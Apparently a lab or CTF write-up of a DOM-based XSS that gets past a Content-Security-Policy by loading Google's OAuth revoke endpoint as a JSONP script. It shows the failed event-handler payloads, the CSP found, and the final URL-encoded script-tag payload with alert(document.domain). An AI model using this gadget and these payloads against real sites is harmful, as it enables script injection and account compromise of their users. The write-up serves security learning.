# CSP Bypass via Google OAuth JSONP Gadget — DOM-based XSS

### Conclusion: the `entry` input is injected into the DOM without escaping → a reflected, DOM-based XSS.

### Step 1: Initial Attempts

#### Attempt 1 — simple payload with an event handler

```
?entry=<img src=x onerror=alert(1)>
```

**Result:** The tag reflected (a real element was created in the DOM), but `alert` never fired.

#### Attempt 2 — obfuscating the function name to dodge a possible keyword filter

```
?entry=<svg onload=prompt(1)>
?entry=<img src=x onerror=self['al'+'ert'](1)>
```

**Result:** Still didn't execute. This ruled out the initial assumption (a WAF/Cloudflare keyword filter), since even obfuscated payloads failed — meaning the real blocker was something else.

#### Finding the Actual Cause

Checking the browser console revealed a CSP violation:

```
Refused to execute inline event handler because it violates CSP directive: script-src ...
```

So the issue wasn't a WAF at all — it was a **Content-Security-Policy** defined via `<meta http-equiv="Content-Security-Policy">`:

```
default-src 'none';
script-src 'self' https://accounts.google.com https://www.googletagmanager.com 'sha256-...';
object-src 'none';
base-uri 'none';
...
```

This meant:

- No `unsafe-inline` → every `onerror=`, `onload=`, `javascript:` handler is blocked outright, regardless of how it's written.
- Only scripts loaded from `'self'`, `accounts.google.com`, `googletagmanager.com`, or matching the given hash are allowed.

So obfuscating the event handler was never going to help — the whole approach had to change.

### Step 2: Identifying the Bypass Gadget

Since `accounts.google.com` was whitelisted in `script-src`, a well-known gadget applied: Google's legacy OAuth endpoint echoes the `callback` parameter back as JSONP and executes it:

```
https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)
```

Because the host (`accounts.google.com`) is explicitly allowed by the CSP, the browser trusts and executes this script with no restriction — this is one of the most well-known CSP bypass techniques for policies that whitelist Google Sign-In.

---

### Step 3: Combining It With the `.html()` Mechanism

Since in `LabQuery.prototype.html()` only tags rebuilt via `appendChild` (i.e. the `<script>` element itself) actually execute, and `src` is one of the copied attributes, the final payload became:

```
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)"></script>
```

URL-encoded for the query string:

```
?entry=%3Cscript%20src%3D%22https%3A%2F%2Faccounts.google.com%2Fo%2Foauth2%2Frevoke%3Fcallback%3Dalert(document.domain)%22%3E%3C%2Fscript%3E
```

**Result: `alert` fired successfully.** ✅

#### 



#### LATEST PAYLOAD :

```url
https://df46585bf0.0o8.ir/?entry=%3Cscript%20src=%22https://accounts.google.com/o/oauth2/revoke?callback=alert(document.origin)%22%3E%3C/script%3E
```
